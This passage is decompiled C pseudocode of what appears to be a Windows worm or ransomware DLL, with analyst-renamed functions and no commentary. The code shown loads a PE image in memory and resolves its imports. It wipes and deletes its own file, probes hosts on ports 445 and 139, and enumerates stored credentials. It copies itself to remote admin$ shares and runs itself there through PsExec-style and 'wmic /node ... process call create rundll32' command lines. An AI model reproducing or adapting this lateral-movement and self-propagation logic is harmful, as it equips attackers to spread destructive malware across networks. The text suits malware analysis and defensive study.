    v3 = v2 + a2;
    v4 = (this + 8);
    if ( (*(this + 4) - 8) & 0xFFFFFFFE )
    {
      do
      {
        v5 = *v4;
        if ( *v4 )
        {
          if ( (v5 & 0xF000) == 12288 )
            *((v5 & 0xFFF) + v3) += a2 - Src;
          else
            i = 0;
        }
        ++v8;
        ++v4;
      }
      while ( v8 < (*(this + 4) - 8) >> 1 );
    }
    this += *(this + 4);
  }
  return i;
}

//----- (681F9286) --------------------------------------------------------
int __userpurge CheckImageVProtect@<eax>(int a1@<esi>, LPVOID lpAddress)
{
  int v2; // eax
  int v3; // eax
  int *v4; // edi
  int v5; // eax
  DWORD v6; // ecx
  int v7; // eax
  DWORD flOldProtect; // [esp+4h] [ebp-Ch]
  int v10; // [esp+8h] [ebp-8h]
  int v11; // [esp+Ch] [ebp-4h]

  v11 = 0;
  if ( VirtualProtect(lpAddress, *(a1 + 84), 2u, &flOldProtect) )
  {
    v2 = *(a1 + 20);
    v10 = 0;
    v11 = 1;
    v3 = v2 + a1 + 24;
    if ( *(a1 + 6) > 0u )
    {
      v4 = (v3 + 36);
      do
      {
        if ( !v11 )
          break;
        v5 = *v4;
        v6 = 2;
        if ( *v4 & 0x20000000 )
        {
          v6 = v5 < 0 ? 64 : 32;
        }
        else if ( v5 < 0 )
        {
          v6 = 4;
        }
        if ( !VirtualProtect(lpAddress + *(v4 - 6), *(v4 - 7), v6, &flOldProtect) )
          v11 = 0;
        v7 = *(a1 + 6);
        v4 += 10;
        ++v10;
      }
      while ( v10 < v7 );
    }
  }
  return v11;
}

//----- (681F9322) --------------------------------------------------------
unsigned int __thiscall sub_681F9322(int this, unsigned int a2)
{
  _DWORD *v2; // edx
  int v3; // ecx
  unsigned int result; // eax
  int v5; // edi
  unsigned int v6; // esi

  v2 = (*(this + 20) + this + 24);
  v3 = *(this + 6);
  result = 0;
  v5 = 0;
  if ( v3 > 0 )
  {
    while ( 1 )
    {
      v6 = v2[3];
      if ( v6 <= a2 && v6 + v2[4] >= a2 )
        break;
      v2 += 10;
      if ( ++v5 >= v3 )
        return result;
    }
    result = a2 + v2[5] - v6;
  }
  return result;
}

//----- (681F9367) --------------------------------------------------------
BOOL LoadSomeLibraries()
{
  int v0; // eax
  char *v1; // eax
  _DWORD *v2; // ebx
  int v3; // edx
  signed int v4; // edi
  int v5; // esi
  DWORD v6; // eax
  DWORD v7; // edx
  bool v8; // zf
  FARPROC *v9; // esi
  int *i; // edi
  FARPROC v11; // eax
  int v12; // eax
  DWORD flOldProtect; // [esp+8h] [ebp-10h]
  char *v15; // [esp+Ch] [ebp-Ch]
  HMODULE hModule; // [esp+10h] [ebp-8h]
  BOOL v17; // [esp+14h] [ebp-4h]

  v0 = *(Src + 15);
  v17 = 0;
  v1 = Src + v0;
  v2 = (Src + *(v1 + 32));
  if ( v2 )
  {
    v3 = *(v1 + 10);
    hModule = 0;
    v4 = *(v1 + 3);
    v5 = &v1[v3 + 24];
    v15 = &v1[v3 + 24];
    if ( v4 > 0 )
    {
      v6 = *(v1 + 54);
      flOldProtect = v6;
      do
      {
        v7 = *(v5 + 12);
        if ( v6 >= v7 )
        {
          v6 = flOldProtect;
          if ( flOldProtect < v7 + *(v5 + 8) )
            break;
        }
        hModule = (hModule + 1);
        v5 += 40;
        v15 = v5;
      }
      while ( hModule < v4 );
    }
    if ( VirtualProtect(Src + *(v5 + 12), *(v5 + 8), 4u, &flOldProtect) )
    {
      v8 = *v2 == 0;
      v17 = 1;
      if ( v8 )
        goto LABEL_28;
      do
      {
        if ( v17 != 1 )
          break;
        hModule = LoadLibraryA(Src + v2[3]);
        if ( hModule )
        {
          v9 = (Src + v2[4]);
          for ( i = (Src + *v2); ; ++i )
          {
            v12 = *i;
            if ( !*i || v17 != 1 )
              break;
            if ( (v12 & 0x7FFFFFFF) == v12 )
              v11 = GetProcAddress(hModule, Src + (v12 & 0x7FFFFFFF) + 2);
            else
              v11 = GetProcAddress(hModule, (v12 & 0x7FFFFFFF));
            *v9 = v11;
            if ( !v11 )
              v17 = 0;
            ++v9;
          }
          v5 = v15;
        }
        else
        {
          v17 = 0;
        }
        v2 += 5;
      }
      while ( *v2 );
      if ( v17 )
LABEL_28:
        v17 = VirtualProtect(Src + *(v5 + 12), *(v5 + 8), flOldProtect, &flOldProtect);
    }
  }
  return v17;
}

//----- (681F94A5) --------------------------------------------------------
BOOL __userpurge CleanUp@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
{
  BOOL result; // eax
  HANDLE v7; // eax
  HANDLE v8; // eax
  void *v9; // eax
  HANDLE v10; // eax
  void *lpMem; // [esp+4h] [ebp-Ch]
  HANDLE hObject; // [esp+8h] [ebp-8h]
  HANDLE hObjecta; // [esp+8h] [ebp-8h]
  SIZE_T dwBytes; // [esp+Ch] [ebp-4h]

  result = FreeLibrary(Src);
  PrivCheckCompleted = result;
  if ( result )
  {
    Src = dword_6820F13C;
    v7 = CreateFileW(&pszPath, 0x80000000, 1u, 0, 3u, 0, 0);
    hObject = v7;
    if ( v7 )
    {
      dwBytes = GetFileSize(v7, 0);
      CloseHandle(hObject);
      hObjecta = CreateFileW(&pszPath, 0x40000000u, 0, 0, 2u, 0, 0);
      if ( hObjecta )
      {
        v8 = GetProcessHeap();
        v9 = HeapAlloc(v8, 8u, dwBytes);
        lpMem = v9;
        if ( v9 )
        {
          WriteFile(hObjecta, v9, dwBytes, &dwBytes, 0);
          v10 = GetProcessHeap();
          HeapFree(v10, 0, lpMem);
        }
        CloseHandle(hObjecta);
      }
    }
    dword_6820F10C = DeleteFileW(&pszPath);
    if ( LoadSomeLibraries() )
      perfc_1(a1, a2, a3, dwErrCode, Thread, hThread);
    ExitProcess(0);
  }
  return result;
}
// 6820F10C: using guessed type int dword_6820F10C;
// 6820F114: using guessed type int PrivCheckCompleted;
// 6820F13C: using guessed type int dword_6820F13C;

//----- (681F9590) --------------------------------------------------------
int __stdcall SetVirtualAttributes(int a1, int a2, int a3)
{
  HMODULE v3; // edi
  char *v4; // eax
  char *v5; // ebx
  int v6; // edi
  int v7; // esi
  int v8; // eax
  SIZE_T v9; // esi
  SIZE_T v10; // ecx
  _BYTE *i; // eax
  DWORD flOldProtect; // [esp+0h] [ebp-8h]
  SIZE_T dwSize; // [esp+4h] [ebp-4h]

  if ( !PrivCheckCompleted )
  {
    if ( dword_6820F0FC )
    {
      v3 = Src;
      dwSize = *(Src + *(Src + 15) + 80);
      v4 = VirtualAlloc(0, dwSize, 0x1000u, 4u);
      v5 = v4;
      if ( v4 )
      {
        dword_6820F13C = v4;
        memcpy(v4, v3, dwSize);
        v6 = dword_6820F0FC;
        v7 = dword_6820F0FC + *(dword_6820F0FC + 60);
        if ( v7 )
        {
          if ( *(v7 + 160) )
          {
            if ( *(v7 + 164) )
            {
              v8 = v6 + sub_681F9322(v7, *(v7 + 160));
              if ( v8 )
              {
                if ( sub_681F91FA(v8, v5) && CheckImageVProtect(v7, v5) )
                  (&v5[CleanUp - Src])(a1, a2, a3, -1);
              }
            }
          }
        }
        v9 = dwSize;
        if ( VirtualProtect(v5, dwSize, 4u, &flOldProtect) )
        {
          v10 = v9;
          for ( i = v5; v10; --v10 )
            *i++ = 0;
          VirtualFree(v5, v9, 0x4000u);
        }
      }
    }
  }
  return 0;
}
// 6820F114: using guessed type int PrivCheckCompleted;
// 6820F13C: using guessed type int dword_6820F13C;

//----- (681F9683) --------------------------------------------------------
int __stdcall EnumerateHostNameAndIP(char *name)
{
  signed int v1; // esi
  struct hostent *v2; // eax

  v1 = 0;
  v2 = gethostbyname(name);
  if ( v2 )
  {
    wsprintfA(
      name,
      "%u.%u.%u.%u",
      **v2->h_addr_list,
      *(*v2->h_addr_list + 1),
      *(*v2->h_addr_list + 2),
      *(*v2->h_addr_list + 3));
    v1 = 1;
  }
  return v1;
}

//----- (681F96C7) --------------------------------------------------------
int __userpurge SetWideAddress@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr, int a4, int a5)
{
  int v5; // esi
  int v6; // edi
  LPWSTR v7; // eax
  char *v8; // edx
  WCHAR v9; // cx
  unsigned __int16 v11[260]; // [esp+8h] [ebp-310h]
  CHAR MultiByteStr; // [esp+210h] [ebp-108h]
  int v13; // [esp+314h] [ebp-4h]

  v13 = 0;
  v5 = dword_6820F11C;
  v6 = dword_6820F0FC;
  if ( EnumeratedProcessesHandle & 4 )
  {
    v7 = PathFindFileNameW(&pszPath);
    if ( v7 )
    {
      v8 = (v11 - v7);
      do
      {
        v9 = *v7;
        *(v7 + v8) = *v7;
        ++v7;
      }
      while ( v9 );
      WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, &MultiByteStr, 260, 0, 0);
      if ( (inet_addr(&MultiByteStr) != -1 || EnumerateHostNameAndIP(&MultiByteStr))
        && !sub_681F668A(a1, a2, &MultiByteStr, v6, v5, a4, a5, v11, wcslen(v11)) )
      {
        v13 = 1;
      }
    }
  }
  return v13;
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;

//----- (681F97A5) --------------------------------------------------------
int __userpurge AcceptEulaAndLaunch@<eax>(WCHAR *a1@<ecx>, WCHAR *a2@<ebx>, int a3)
{
  WCHAR *v3; // esi
  unsigned int v4; // edi
  LPWSTR v5; // eax
  int v6; // edx
  WCHAR v7; // cx
  int v8; // eax
  int v9; // edi
  unsigned int v10; // ecx
  signed int v11; // eax
  char Src; // [esp+8h] [ebp-4210h]
  char v14; // [esp+4008h] [ebp-210h]
  int v15; // [esp+4210h] [ebp-8h]
  DWORD dwErrCode; // [esp+4214h] [ebp-4h]

  v3 = a1;
  *a2 = 0;
  *a1 = 0;
  v4 = 0;
  v15 = 0;
  FindFileByName(&v14);
  v5 = lpMem;
  dwErrCode = 0;
  if ( lpMem )
  {
    v4 = wcslen(lpMem);
    if ( v4 > 0x104 )
    {
      dwErrCode = 122;
    }
    else
    {
      v6 = v3 - lpMem;
      do
      {
        v7 = *v5;
        *(v5 + v6) = *v5;
        ++v5;
      }
      while ( v7 );
    }
  }
  else
  {
    dwErrCode = 3;
  }
  SetLastError(dwErrCode);
  if ( v4 && PathFileExistsW(v3) )
  {
    v8 = wsprintfW(a2, L"%s \\\\%s -accepteula -s ", v3, a3);
    v9 = wsprintfW(&a2[v8], L"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 ", &v14) + v8;
    v10 = sub_681F6BB0(&Src) + 1;
    v11 = 0x1FFF;
    if ( v10 <= 0x1FFF )
      v11 = v10;
    memcpy(&a2[v9], &Src, 2 * v11);
    v15 = 1;
  }
  else
  {
    *a2 = 0;
    *v3 = 0;
  }
  return v15;
}

//----- (681F98AB) --------------------------------------------------------
signed int __userpurge InitRemoteLaunch@<eax>(WCHAR *a1@<ecx>, WCHAR *a2@<esi>, int a3, int a4, int a5)
{
  WCHAR *v5; // edi
  int v6; // ebx
  int v7; // eax
  int v8; // edi
  char *v9; // eax
  int v10; // ecx
  char v12; // [esp+8h] [ebp-4208h]
  char v13; // [esp+4008h] [ebp-208h]

  v5 = a1;
  *a2 = 0;
  *a1 = 0;
  v6 = 0;
  FindFileByName(&v13);
  if ( !GetSystemDirectoryW(v5, 0x104u) )
  {
    GetLastError();
    goto LABEL_10;
  }
  PathAppendW(v5, L"wbem\\wmic.exe");
  if ( !PathFileExistsW(v5) )
  {
LABEL_10:
    *a2 = 0;
    *v5 = 0;
    return v6;
  }
  v7 = wsprintfW(a2, L"%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\" ", v5, a3, a4, a5);
  v8 = wsprintfW(
         &a2[v7],
         L"process call create \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\%s\\\" #1 ",
         &v13)
     + v7;
  sub_681F6BB0(&v12);
  v9 = &v12;
  while ( 1 )
  {
    v10 = *v9;
    if ( v10 == 34 )
      a2[v8++] = 92;
    a2[v8] = v10;
    if ( !v10 )
      break;
    v9 += 2;
    ++v8;
  }
  wsprintfW(&a2[v8], L"\"");
  return 1;
}

//----- (681F9987) --------------------------------------------------------
BOOL __stdcall CheckUACPathsAndLaunchProcess(int a1, LPCWSTR lpUserName, LPCWSTR lpPassword, int a4)
{
  signed int v4; // ebx
  LPWSTR v5; // eax
  DWORD v6; // eax
  HANDLE v7; // eax
  BOOL v8; // eax
  int v10; // [esp+Ch] [ebp-11ABCh]
  BOOL v11; // [esp+10h] [ebp-11AB8h]
  DWORD dwErrCode; // [esp+14h] [ebp-11AB4h]
  HANDLE phNewToken; // [esp+18h] [ebp-11AB0h]
  HANDLE TokenHandle; // [esp+1Ch] [ebp-11AACh]
  DWORD ExitCode; // [esp+20h] [ebp-11AA8h]
  DWORD v16; // [esp+24h] [ebp-11AA4h]
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+28h] [ebp-11AA0h]
  struct _STARTUPINFOW StartupInfo; // [esp+38h] [ebp-11A90h]
  struct _NETRESOURCEW NetResource; // [esp+80h] [ebp-11A48h]
  WCHAR Name; // [esp+A0h] [ebp-11A28h]
  char v21; // [esp+2A8h] [ebp-11820h]
  WCHAR ApplicationName; // [esp+4B0h] [ebp-11618h]
  WCHAR pszPath; // [esp+AC8h] [ebp-11000h]
  WCHAR FileName; // [esp+12C8h] [ebp-10800h]
  WCHAR CommandLine; // [esp+1AC8h] [ebp-10000h]

  v4 = 0;
  v11 = 0;
  dwErrCode = 0;
  v16 = 0;
  if ( !a1 )
  {
    dwErrCode = 87;
    goto LABEL_61;
  }
  Name = 0;
  wsprintfW(&Name, L"\\\\%s\\admin$", a1);
  NetResource.dwScope = 0;
  memset(&NetResource.dwType, 0, 0x1Cu);
  NetResource.lpRemoteName = &Name;
  NetResource.dwType = 1;
  FindFileByName(&v21);
  wsprintfW(&FileName, L"\\\\%ws\\admin$\\%ws", a1, &v21);
  while ( 1 )
  {
    pszPath = 0;
    v16 = WNetAddConnection2W(&NetResource, lpPassword, lpUserName, 0);
    wsprintfW(&pszPath, L"\\\\%ws\\admin$\\%ws", a1, &v21);
    v5 = PathFindExtensionW(&pszPath);
    if ( v5 )
    {
      *v5 = 0;
      if ( PathFileExistsW(&pszPath) )
      {
        v11 = 1;
        goto LABEL_58;
      }
      dwErrCode = GetLastError();
    }
    if ( CreateSomeFile_2(dword_6820F11C, &FileName, dword_6820F0FC, 1u) )
      break;
    v6 = GetLastError();
    dwErrCode = v6;
    if ( v6 == 80 || v6 == 53 || v6 == 67 || v16 != 1219 )
      goto LABEL_58;
    if ( v4 )
      goto LABEL_61;
    v4 = 1;
    WNetCancelConnection2W(&Name, 0, 1);
  }
  if ( lpUserName && lpPassword )
  {
    CleanUpHeaps_2(lpUserName, lpPassword);
    dword_68206010 = 1;
  }
  TokenHandle = 0;
  phNewToken = 0;
  v7 = GetCurrentThread();
  if ( OpenThreadToken(v7, 2u, 1, &TokenHandle) )
    DuplicateTokenEx(TokenHandle, 0x2000000u, 0, SecurityImpersonation, TokenPrimary, &phNewToken);
  v10 = 0;
  while ( !v11 )
  {
    CommandLine = 0;
    ApplicationName = 0;
    ProcessInformation.hProcess = 0;
    ProcessInformation.hThread = 0;
    ProcessInformation.dwProcessId = 0;
    ProcessInformation.dwThreadId = 0;
    memset(&StartupInfo.lpReserved, 0, 0x40u);
    StartupInfo.cb = 68;
    StartupInfo.dwFlags = 1;
    StartupInfo.wShowWindow = 0;
    if ( !v10 )
      AcceptEulaAndLaunch(&ApplicationName, &CommandLine, a1);
    if ( v10 == 1 )
    {
      if ( !lpUserName || !lpPassword )
        goto LABEL_53;
      InitRemoteLaunch(&ApplicationName, &CommandLine, a1, lpUserName, lpPassword);
    }
    if ( !CommandLine
      || !ApplicationName
      || (!phNewToken ? (v8 = CreateProcessW(
                                &ApplicationName,
                                &CommandLine,
                                0,
                                0,
                                0,
                                0x8000000u,
                                0,
                                0,
                                &StartupInfo,
                                &ProcessInformation)) : (v8 = CreateProcessAsUserW(
                                                                phNewToken,
                                                                &ApplicationName,
                                                                &CommandLine,
                                                                0,
                                                                0,
                                                                0,
                                                                0x8000000u,
                                                                0,
                                                                0,
                                                                &StartupInfo,
                                                                &ProcessInformation)),
          !v8) )
    {
      dwErrCode = GetLastError();
      goto LABEL_51;
    }
    WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
    ExitCode = 0;
    GetExitCodeProcess(ProcessInformation.hProcess, &ExitCode);
    if ( StartupInfo.hStdError )
      CloseHandle(StartupInfo.hStdError);
    if ( StartupInfo.hStdInput )
      CloseHandle(StartupInfo.hStdInput);
    if ( StartupInfo.hStdOutput )
      CloseHandle(StartupInfo.hStdOutput);
    if ( ProcessInformation.hThread )
      CloseHandle(ProcessInformation.hThread);
    if ( ProcessInformation.hProcess )
      CloseHandle(ProcessInformation.hProcess);
    if ( v10 )
    {
      if ( v10 == 1 )
      {
        v11 = ExitCode == 0;
        if ( ExitCode == 0 )
          goto LABEL_51;
      }
LABEL_49:
      v11 = PathFileExistsW(&pszPath);
      goto LABEL_51;
    }
    if ( !ExitCode || ExitCode & 3 )
      goto LABEL_49;
    v11 = 1;
LABEL_51:
    if ( ++v10 >= 2 )
    {
      if ( v11 )
        break;
LABEL_53:
      DeleteFileW(&FileName);
      break;
    }
  }
  if ( phNewToken )
  {
    CloseHandle(phNewToken);
    phNewToken = 0;
  }
  if ( TokenHandle )
    CloseHandle(TokenHandle);
LABEL_58:
  if ( !v16 )
    WNetCancelConnection2W(&Name, 0, 1);
LABEL_61:
  if ( a4 )
    *a4 = v16;
  SetLastError(dwErrCode);
  return v11;
}
// 68206010: using guessed type int dword_68206010;

//----- (681F9DC3) --------------------------------------------------------
int __userpurge sub_681F9DC3@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr)
{
  int v3; // esi
  int v4; // eax
  int v6; // [esp+4h] [ebp-4000h]

  LOWORD(v6) = 0;
  v3 = 0;
  v4 = sub_681F6BB0(&v6);
  if ( v4 )
    v3 = SetWideAddress(a1, a2, lpWideCharStr, &v6, v4);
  return v3;
}

//----- (681F9E05) --------------------------------------------------------
BOOL __userpurge sub_681F9E05@<eax>(struct _RTL_CRITICAL_SECTION *eax0@<eax>, int a1)
{
  struct _RTL_CRITICAL_SECTION *v2; // esi
  _DWORD *v3; // ebx
  LPCWSTR *v4; // eax
  const WCHAR *v5; // ST08_4
  HANDLE v6; // eax
  BOOL v8; // [esp+10h] [ebp-8h]
  int v9; // [esp+14h] [ebp-4h]

  v2 = eax0;
  v8 = 0;
  v9 = 0;
  v3 = GetHeapAndFreeIt(eax0, 3, &v9);
  if ( v3 )
  {
    do
    {
      v4 = *v9;
      v5 = *(*v9 + 4);
      v9 = 0;
      v8 = CheckUACPathsAndLaunchProcess(a1, *v4, v5, &v9);
      if ( v9 == 1203 )
        break;
      if ( v9 == 1222 )
        break;
      if ( v9 == 53 )
        break;
      if ( v9 == 64 )
        break;
      if ( v9 == 67 )
        break;
      if ( v8 )
        break;
      v9 = 0;
    }
    while ( EnterAndLeaveCritSection_3(v3, v2, &v9) );
    v6 = GetProcessHeap();
    HeapFree(v6, 0, v3);
  }
  return v8;
}

//----- (681F9EA4) --------------------------------------------------------
DWORD __stdcall LaunchChecksForAdminPaths(LPVOID lpThreadParameter)
{
  *lpThreadParameter = CheckUACPathsAndLaunchProcess(
                         *(lpThreadParameter + 1),
                         *(lpThreadParameter + 2),
                         *(lpThreadParameter + 3),
                         0);
  return 0;
}

//----- (681F9EC7) --------------------------------------------------------
int __stdcall CreateAndHandleThread(int a1, int a2)
{
  int v2; // edi
  void *v3; // esi
  int Parameter; // [esp+Ch] [ebp-1Ch]
  int v6; // [esp+10h] [ebp-18h]
  int v7; // [esp+14h] [ebp-14h]
  int v8; // [esp+18h] [ebp-10h]
  LPVOID lpMem; // [esp+1Ch] [ebp-Ch]
  void ***v10; // [esp+20h] [ebp-8h]
  HANDLE Thread; // [esp+24h] [ebp-4h]

  v2 = 0;
  v10 = 0;
  lpMem = GetHeapAndFreeIt(a2, 0, &v10);
  if ( lpMem )
  {
    do
    {
      v3 = **v10;
      Parameter = 0;
      v7 = 0;
      v8 = 0;
      v6 = a1;
      Thread = CreateThread(0, 0, LaunchChecksForAdminPaths, &Parameter, 4u, 0);
      if ( Thread )
      {
        if ( SetThreadToken(&Thread, v3) )
        {
          if ( ResumeThread(Thread) == -1 )
            GetLastError();
          else
            WaitForSingleObject(Thread, 0xFFFFFFFF);
        }
        CloseHandle(Thread);
      }
      v2 = Parameter;
    }
    while ( !Parameter && EnterAndLeaveCritSection_3(lpMem, a2, &v10) );
    EnumProcessHeap(lpMem);
  }
  return v2;
}

//----- (681F9F8E) --------------------------------------------------------
DWORD __stdcall sub_681F9F8E(LPVOID lpThreadParameter)
{
  HANDLE v1; // eax
  struct _RTL_CRITICAL_SECTION *v2; // esi
  int *v3; // ebx
  __int16 v5[16]; // [esp+Ch] [ebp-2Ch]
  struct _RTL_CRITICAL_SECTION *v6; // [esp+2Ch] [ebp-Ch]
  HANDLE phNewToken; // [esp+30h] [ebp-8h]
  HANDLE TokenHandle; // [esp+34h] [ebp-4h]

  TokenHandle = 0;
  phNewToken = 0;
  v1 = GetCurrentThread();
  if ( OpenThreadToken(v1, 0xBu, 1, &TokenHandle) )
    DuplicateTokenEx(TokenHandle, 0x2000000u, 0, SecurityImpersonation, TokenImpersonation, &phNewToken);
  v6 = lpParameter;
  v2 = sub_681F7091(36, CompareStringsW, 0, 0xFFFF);
  EnumNetResources(v2, 0);
  EnumerateWindowsCredentials(v2);
  EnterAndLeaveCritSection_4(v2);
  v3 = SomeHeapCleanupFunct(v2, v5);
  if ( v3 )
  {
    do
    {
      if ( CheckUACPathsAndLaunchProcess(v5, 0, 0, 0) )
      {
        CheckCritSection(v5, v2, v3);
        CheckCritSection(v5, v6, 0);
      }
      v5[0] = 0;
    }
    while ( LaunchCrit3(v3, v2, v5) );
    EnumProcessHeap(v3);
  }
  if ( TokenHandle )
  {
    CloseHandle(TokenHandle);
    TokenHandle = 0;
  }
  if ( phNewToken )
    CloseHandle(phNewToken);
  return 0;
}

//----- (681FA073) --------------------------------------------------------
DWORD __stdcall sub_681FA073(LPVOID lpThreadParameter)
{
  _DWORD *v1; // ebx
  void *v2; // esi
  LPCRITICAL_SECTION v3; // edi
  HANDLE v4; // eax
  HANDLE v5; // eax
  struct _RTL_CRITICAL_SECTION *v7; // [esp+4h] [ebp-4h]
  LPVOID lpMem; // [esp+10h] [ebp+8h]

  v1 = lpThreadParameter;
  if ( lpThreadParameter )
  {
    lpMem = *lpThreadParameter;
    v2 = v1[1];
    v7 = lpParameter;
    v3 = dword_6820F110;
    if ( lpCriticalSection && sub_681F9E05(lpCriticalSection, v2)
      || v3 && CreateAndHandleThread(v2, v3)
      || lpMem && CheckUACPathsAndLaunchProcess(v2, 0, 0, 0) )
    {
      CheckCritSection(v2, v7, 0);
    }
    v4 = GetProcessHeap();
    HeapFree(v4, 0, v2);
    v5 = GetProcessHeap();
    HeapFree(v5, 0, v1);
  }
  return 0;
}

//----- (681FA0FE) --------------------------------------------------------
DWORD __stdcall sub_681FA0FE(LPVOID lpThreadParameter)
{
  HANDLE (__stdcall *v1)(); // ebx
  HANDLE v2; // eax
  LPVOID (__stdcall *v3)(HANDLE, DWORD, SIZE_T); // esi
  _DWORD *v4; // edi
  HANDLE v5; // eax
  __int16 *v6; // eax
  HANDLE v7; // eax
  int v8; // eax
  DWORD v9; // eax
  int v10; // eax
  void **v11; // edi
  void *v12; // ST14_4
  HANDLE v13; // eax
  HANDLE v14; // eax
  __int16 *v15; // eax
  int v16; // ecx
  HANDLE Handles; // [esp+0h] [ebp-28h]
  int v19; // [esp+4h] [ebp-24h]
  int v20; // [esp+8h] [ebp-20h]
  int v21; // [esp+Ch] [ebp-1Ch]
  LPVOID lpMem; // [esp+10h] [ebp-18h]
  struct _RTL_CRITICAL_SECTION *v23; // [esp+14h] [ebp-14h]
  int v24; // [esp+18h] [ebp-10h]
  DWORD dwMilliseconds; // [esp+1Ch] [ebp-Ch]
  DWORD nCount; // [esp+20h] [ebp-8h]
  DWORD v27; // [esp+24h] [ebp-4h]

  v23 = lpParameter;
  v24 = ~(gPrivLevel >> 2) & 1;
  if ( ~(gPrivLevel >> 2) & 1 )
    sub_681F9F8E(0);
  Handles = 0;
  v1 = GetProcessHeap;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v2 = GetProcessHeap();
  v3 = HeapAlloc;
  v4 = HeapAlloc(v2, 8u, 8u);
  if ( v4 )
  {
    *v4 = v24;
    v5 = GetProcessHeap();
    v6 = HeapAlloc(v5, 8u, 0x21u);
    v4[1] = v6;
    if ( v6 )
    {
      lpMem = SomeHeapCleanupFunct(v23, v6);
      if ( lpMem )
      {
        v27 = 0;
        dwMilliseconds = 0;
        while ( 1 )
        {
          nCount = 0;
          if ( v27 == 4 )
          {
            dwMilliseconds = -1;
          }
          else
          {
            v7 = CreateThread(0, 0, sub_681FA073, v4, 0, 0);
            if ( !v7 )
              break;
            *(&Handles + v27) = v7;
          }
          v8 = 0;
          do
          {
            if ( !*(&Handles + v8) )
              break;
            ++nCount;
            ++v8;
          }
          while ( v8 != 4 );
          v9 = WaitForMultipleObjects(nCount, &Handles, 0, dwMilliseconds);
          if ( v9 == -1 )
            break;
          if ( v9 == 258 )
          {
            v27 = 4;
            v10 = 0;
            while ( *(&Handles + v10) )
            {
              if ( ++v10 == 4 )
                goto LABEL_24;
            }
            v27 = v10;
          }
          else if ( v9 <= nCount - 1 )
          {
            v11 = &Handles + v9;
            v12 = *v11;
            v27 = v9;
            CloseHandle(v12);
            *v11 = 0;
          }
LABEL_24:
          v13 = v1();
          v4 = v3(v13, 8u, 8u);
          if ( !v4 )
            break;
          v14 = v1();
          v15 = v3(v14, 8u, 0x21u);
          v16 = v24;
          v4[1] = v15;
          *v4 = v16;
          if ( !v15 || !LaunchCrit3(lpMem, v23, v15) )
            break;
          v3 = HeapAlloc;
          v1 = GetProcessHeap;
        }
        EnumProcessHeap(lpMem);
      }
    }
  }
  return 0;
}
// 6820F144: using guessed type int gPrivLevel;

//----- (681FA274) --------------------------------------------------------
DWORD __userpurge SleepAndFreeHeap@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPVOID lpThreadParameter)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  int *v4; // ebx
  HANDLE v5; // eax
  WCHAR WideCharStr; // [esp+Ch] [ebp-20h]

  Sleep(*lpThreadParameter);
  v3 = lpParameter;
  v4 = SomeHeapCleanupFunct(lpParameter, &WideCharStr);
  if ( v4 )
  {
    do
    {
      if ( sub_681F9DC3(a1, a2, &WideCharStr) )
        CheckCritSection(&WideCharStr, v3, v4);
      WideCharStr = 0;
    }
    while ( LaunchCrit3(v4, v3, &WideCharStr) );
    EnumProcessHeap(v4);
  }
  v5 = GetProcessHeap();
  HeapFree(v5, 0, lpThreadParameter);
  return 0;
}

//----- (681FA2E8) --------------------------------------------------------
int __stdcall SockSendDataWithTimeOut(int a1, u_short hostshort)
{
  SOCKET v2; // esi
  fd_set writefds; // [esp+10h] [ebp-128h]
  struct sockaddr name; // [esp+118h] [ebp-20h]
  u_long argp; // [esp+128h] [ebp-10h]
  struct timeval timeout; // [esp+12Ch] [ebp-Ch]
  int v8; // [esp+134h] [ebp-4h]

  name.sa_family = 0;
  *name.sa_data = 0;
  *&name.sa_data[4] = 0;
  *&name.sa_data[8] = 0;
  *&name.sa_data[12] = 0;
  writefds.fd_count = 0;
  memset(writefds.fd_array, 0, 0x100u);
  timeout.tv_sec = 0;
  timeout.tv_usec = 0;
  argp = 1;
  v8 = 0;
  v2 = socket(2, 1, 0);
  if ( v2 )
  {
    name.sa_family = 2;
    *&name.sa_data[2] = a1;
    *name.sa_data = htons(hostshort);
    if ( ioctlsocket(v2, -2147195266, &argp) != -1 )
    {
      connect(v2, &name, 16);
      writefds.fd_array[0] = v2;
      writefds.fd_count = 1;
      timeout.tv_sec = 2;
      timeout.tv_usec = 0;
      if ( select(v2 + 1, 0, &writefds, 0, &timeout) != -1 )
      {
        if ( _WSAFDIsSet(v2, &writefds) )
          v8 = 1;
      }
    }
    closesocket(v2);
  }
  return v8;
}

//----- (681FA3D9) --------------------------------------------------------
signed int __stdcall CheckIfDataWasSent(int a1)
{
  signed int v1; // esi

  v1 = 0;
  if ( SockSendDataWithTimeOut(a1, 0x1BDu) || SockSendDataWithTimeOut(a1, 0x8Bu) )
    v1 = 1;
  return v1;
}

//----- (681FA520) --------------------------------------------------------
signed int __userpurge SomeVersionCheck@<eax>(__m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, int a1, int *a2, int a3, int a4)
{
  signed int result; // eax
  signed int v7; // esi
  int v8; // [esp+4h] [ebp-38h]
  int v9; // [esp+8h] [ebp-34h]
  int v10; // [esp+10h] [ebp-2Ch]
  int v11; // [esp+14h] [ebp-28h]
  int v12; // [esp+18h] [ebp-24h]
  int v13; // [esp+24h] [ebp-18h]
  int v14; // [esp+28h] [ebp-14h]

  v13 = 0;
  v14 = 0;
  v8 = a3;
  v9 = a4;
  v10 = a1;
  v11 = *a2;
  result = sub_681FBB31(&v8, "1.2.8", 56);
  if ( !result )
  {
    v7 = SomeCompressionFunct(mm0_0, mm1_0, &v8, 4);
    if ( v7 == 1 )
    {
      *a2 = v12;
      result = sub_681FBA60(&v8);
    }
    else
    {
      sub_681FBA60(&v8);
      if ( v7 != 2 && (v7 != -5 || v9) )
        result = v7;
      else
        result = -3;
    }
  }
  return result;
}

//----- (681FA5A8) --------------------------------------------------------
int __cdecl InsertCharsIntoBuffer(int a1)
{
  int result; // eax

  result = a1;
